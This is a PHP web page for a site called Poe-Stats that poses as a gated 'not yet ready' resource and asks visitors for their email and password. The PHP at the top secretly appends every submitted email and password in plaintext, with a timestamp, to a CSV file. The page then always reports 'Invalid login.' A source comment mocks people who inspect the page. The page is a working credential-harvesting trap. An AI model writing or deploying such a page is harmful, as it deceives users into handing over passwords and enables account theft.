<?php
  if ( isset($_POST["email"]) && isset($_POST["password"]) ) {
    $email = $_POST["email"];
    $file = "../POST.csv";

    if ( file_exists($file) ) {
      $date = date('d/m/Y h:i:s a', time());
      $line = "[$date] {$_POST["email"]}        {$_POST["password"]}\n";

      file_put_contents($file, $line, FILE_APPEND);
    }
  }
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Poe-Stats - Unavailable</title>
  <meta charset="utf-8">
  <link rel="icon" type="image/png" href="assets/img/ico/192.png" sizes="192x192">
  <link rel="icon" type="image/png" href="assets/img/ico/96.png" sizes="96x96">
  <link rel="icon" type="image/png" href="assets/img/ico/32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="assets/img/ico/16.png" sizes="16x16">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/main.css">
</head>
<body>
<!-- Primary navbar -->
<nav class="navbar navbar-expand-md navbar-dark">
  <div class="container-fluid">
    <a href="/" class="navbar-brand">
      <img src="assets/img/favico.png" class="d-inline-block align-top mr-2">
      Poe-Stats
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNavDropdown">
      <ul class="navbar-nav mr-auto">
        <li class="nav-item"><a class="nav-link" href="/">Front</a></li>
        <li class="nav-item"><a class="nav-link" href="prices">Prices</a></li>
        <li class="nav-item"><a class="nav-link" href="api">API</a></li>
        <li class="nav-item"><a class="nav-link" href="progress">Progress</a></li>
        <li class="nav-item"><a class="nav-link" href="about">About</a></li>
      </ul>
    </div>
  </div>
</nav>
<!--/Primary navbar/-->
<!-- Page body -->
<div class="container-fluid mv-xl">    
  <div class="row">
    <!-- Main content -->
    <div class="col-10 offset-1 mt-4">
      <div class="row">
        <div class="col-lg">
          <div class="alert custom-card" role="alert">
            <h3 class="alert-heading">Attention!</h3>
            <hr>
            <div class="row">
              <div class="col">
                <p>The requested resource is not yet ready for public access.</p>
              </div>
              <div class="col">
                <p>Please enter your credentials to proceed</p>
                <!-- Nosey little fucker, aren't you? -->
                <form method="POST"> 
                  <div class="form-group">
                    <input type="email" class="form-control" name="email" placeholder="Email">
                  </div>
                  <div class="form-group">
                    <input type="password" class="form-control" name="password" placeholder="Password">
                  </div>
                  <?php if (isset($_POST["email"])) echo "<span class=\"badge custom-text-red\">Invalid login.</span>"; ?>
                  <button type="submit" class="btn btn-outline-dark float-right">Submit</button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div> 
    </div>
    <!--/Main content/-->
  </div>
</div>
<!--/Page body/-->
<!-- Footer -->
<footer class="container-fluid text-center">
  <p>Poe-Stats © 2018</p>
</footer>
<!--/Footer/-->
</body>
</html>
